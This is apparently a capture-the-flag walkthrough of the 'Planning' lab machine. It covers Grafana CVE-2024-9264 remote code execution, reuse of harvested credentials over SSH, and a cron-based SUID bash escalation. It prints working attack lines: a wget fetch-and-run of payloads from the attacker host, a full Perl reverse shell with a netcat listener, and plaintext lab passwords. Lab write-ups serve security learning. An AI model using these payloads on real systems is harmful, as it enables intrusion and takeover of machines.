# ⚙️ Planning CTF - Walkthrough

## 🔍 Initial Reconnaissance

I began by running a comprehensive `nmap` scan on the target machine to identify open ports and services:

```bash
nmap -sC -sV -A 10.10.11.57
```

The scan revealed several open ports. Notably, port `80` (HTTP) was open. After visiting the site, I added `planning.htb` to my `/etc/hosts` file.

A subsequent `vhost` scan (or manual discovery) revealed a **Grafana** instance running on `grafana.planning.htb`.

## 🌐 Grafana Exploitation (CVE-2024-9264)

I accessed the Grafana login page. From previous enumeration or provided credentials, I logged in. Once authenticated, I checked the Grafana version, which was **v11.0.0**.

This version is vulnerable to **CVE-2024-9264**, an authenticated Remote Code Execution (RCE) vulnerability. A Proof-of-Concept (PoC) exploit is available on GitHub: [https://github.com/nollium/CVE-2024-9264](https://github.com/nollium/CVE-2024-9264).

I used this exploit to achieve RCE. First, I set up a Python HTTP server on my attacking machine to serve a `linpeas.sh` script (or a Perl reverse shell script, as mentioned in the original notes):

```bash
python3 -m http.server 8080
```

Then, I used the CVE exploit with provided Grafana credentials (e.g., `admin:0D5oT70Fq13EvB5r`) to download `linpeas.sh` to the target Grafana container:

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://MyIp:8080/linpeas.sh -O /tmp/linpeas.sh" http://grafana.planning.htb
```

After downloading the script, I executed it via another RCE command:

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh" http://grafana.planning.htb
```

### Initial Reverse Shell

To get a reverse shell, I used a Perl reverse shell payload (as `perl` binary was confirmed to be present in the container). I generated the payload and hosted it on my Python web server, then used the CVE exploit to download and execute it.

```bash
perl -e 'use Socket;$i="MyIp";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

I set up a `netcat` listener on my attacking machine:

```bash
nc -lnvp 4444
```

Then, I used the CVE exploit to download and execute the Perl reverse shell:

```bash
python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "wget http://<your-ip>:8080/shell.pl -O /tmp/shell.pl && chmod +x /tmp/shell.pl && perl /tmp/shell.pl" http://grafana.planning.htb
```

✅ I successfully obtained a reverse shell as `root` within the Docker container.

## ➡️ Container Evasion & Lateral Movement to Enzo

Once inside the Grafana Docker container, I ran `linpeas.sh`. `linpeas` discovered sensitive credentials stored in environment variables: **enzo:RioTecRANDEntANT!**

Assuming credential reuse, I attempted to log in via SSH to the main machine with these credentials:

```bash
ssh enzo@planning.htb
```

✅ The SSH login was successful, granting me access as the `enzo` user. I retrieved the **user flag**.

## ⬆️ Privilege Escalation to Root

While exploring the file system as `enzo`, I found the `crontab.db` file in the `/opt/crontabs` directory. I transferred this file to my attacking machine and inspected its contents.

The `crontab.db` file contained interesting information, including `root_grafanacredentials` for another service and details about scheduled jobs.

I noticed a service running locally on port `8000`. I used SSH port forwarding to access this service from my local machine:

```bash
ssh -L 8000:localhost:8000 enzo@planning.htb
```

Navigating to `http://localhost:8000`, I found a "Crontab UI" interface. Given that the jobs on this system run as `root`, I devised a plan to create a malicious cron job.

My goal was to create a job that would copy the `/bin/bash` binary, set the SUID bit on it, and place it in a writable directory. This would allow me to execute `bash` with root privileges.

I created a new cron job through the "Crontab UI" (or by directly modifying the `crontab.db` and waiting for it to be processed if the UI wasn't exploitable for arbitrary commands, although the UI approach is cleaner here):

```bash
cp /bin/bash /tmp/rbash; chmod +s /tmp/rbash
```

After the cron job executed, I verified the presence of the SUID binary:

```bash
ls -la /tmp/rbash
```

Then, I executed the SUID binary to obtain a root shell:

```bash
/tmp/rbash -p
```

✅ I successfully gained a root shell and retrieved the **root flag**.

## 🎯 Conclusion

The **Planning** machine was successfully completed! 🧩

-   Initial access obtained by exploiting `CVE-2024-9264` (Authenticated RCE) in Grafana v11.0.0, gaining a root shell in the Docker container.
-   Lateral movement to `enzo` by extracting credentials from Docker environment variables and reusing them for SSH access to the host.
-   Privilege escalation to `root` by manipulating the Crontab UI on port 8000 to create a SUID `bash` binary.
-   User and root flags acquired! 🏁

---